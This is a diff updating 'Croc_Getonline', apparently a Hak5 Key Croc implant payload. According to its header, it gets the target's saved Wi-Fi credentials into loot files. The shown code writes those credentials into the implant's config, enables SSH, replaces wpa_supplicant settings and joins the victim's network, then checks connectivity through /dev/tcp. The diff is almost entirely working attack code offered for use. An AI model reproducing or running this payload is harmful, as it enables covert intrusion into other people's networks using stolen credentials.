@@ -1,13 +1,12 @@
 # Title:           Croc_Getonline
 # Description:     Attempt to connect Keycroc automatically to target wifi access point
 #                  Save to tools/Croc_Pot/wifipass.txt and loot/Croc_Pot/old_wifipass.txt
-# Author:          spywill
-# Version:         2.0
+# Author:          Spywill
+# Version:         3.0
 # Category:        Key Croc
-# Props:           Cribbit, Lodrix, potong, RootJunky
+# Props:           Cribbit, Lodrix, potong, RootJunky, dark_pyrro
 
 MATCH (getonline_W|getonline_R|getonline_L)
-Q LOCK
 
 CROC_POT_DIR=(/root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot)
 for dir in "${CROC_POT_DIR[@]}"; do [[ ! -d "$dir" ]] && mkdir "$dir" || LED B; done
@@ -91,11 +90,30 @@ case $LOOT in
 esac
 
 ATTACKMODE HID
-Q DELAY 2000
-Q UNLOCK
+sleep 2
 
 LED SETUP
 sed -i 's/\( \)*/\1/g' /root/udisk/tools/Croc_Pot/wifipass.txt
 sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' root/udisk/config.txt
 sed -i -E -e '1{x;s#^#sed -n 1p root/udisk/tools/Croc_Pot/wifipass.txt#e;x};10{G;s/\n(\S+).*/ \1/};11{G;s/\n\S+//}' root/udisk/config.txt
-LED FINISH
+
+PID_WPA=$(pidof wpa_supplicant)
+PID_DHC=$(pidof dhclient)
+kill -9 $PID_WPA && kill -9 $PID_DHC
+sleep 2
+echo -ne "network={\n\tssid=\"$(sed 's/ .*//' /root/udisk/tools/Croc_Pot/wifipass.txt)\"\n\tpsk=\"$(sed 's/.* //' /root/udisk/tools/Croc_Pot/wifipass.txt)\"\n\tpriority=1\n}" > /etc/wpa_supplicant.conf
+sleep 1 
+wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0
+sleep 5
+ARMING_MODE
+sleep 5
+ATTACKMODE HID
+sleep 3
+
+if : >/dev/tcp/8.8.8.8/53; then
+	LED FINISH
+else
+	LED R
+fi
+sleep 2
+LED OFF
